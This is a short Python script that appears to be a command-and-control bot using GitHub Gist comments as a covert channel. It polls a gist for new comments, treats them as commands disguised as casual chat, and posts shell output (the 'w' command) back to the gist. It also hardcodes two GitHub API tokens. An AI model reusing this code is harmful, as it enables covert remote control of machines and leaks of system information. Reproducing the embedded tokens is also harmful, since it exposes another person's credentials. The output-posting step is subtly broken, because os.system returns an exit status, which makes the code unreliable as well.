from simplegist import Simplegist
import time
import random
import os
import psutil

GHgistController = Simplegist(username='jirikdan', api_token='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')
GhgistBot = Simplegist(username='TheQfr', api_token='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')
comments = GHgistController.comments().listall(name='secret.txt')

commentsNumber = len(comments)

#GHgistController.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='very helpful')


botIsAliveAnswers = ["Ye, im there", "No, I am soo booored", "Hmm someone is bored :P"]
botIsAliveQuestions = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]
controllerQuestions = botIsAliveQuestions

print(os.system("who | head -n1 | awk '{print $1;}'"))

def handleCommands(command):
    print("Command = " + command)
    if command == "Hey":
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='Yo')
    if command in botIsAliveQuestions:
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveAnswers))
    if command.startswith("w"):
        print("Handling command W")
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=str(os.system('w')))

while(True):
     currComments = GHgistController.comments().listall(name='secret.txt')
     currCommentsNumber = len(currComments)
     #print(currCommentsNumber)
     if currCommentsNumber != commentsNumber:
        commentsDiff = currCommentsNumber - commentsNumber
        print("Received command")
        for i in range(0,commentsDiff):
            handleCommands(currComments[len(currComments)-1 - i])

        commentsNumber = currCommentsNumber
     time.sleep(3)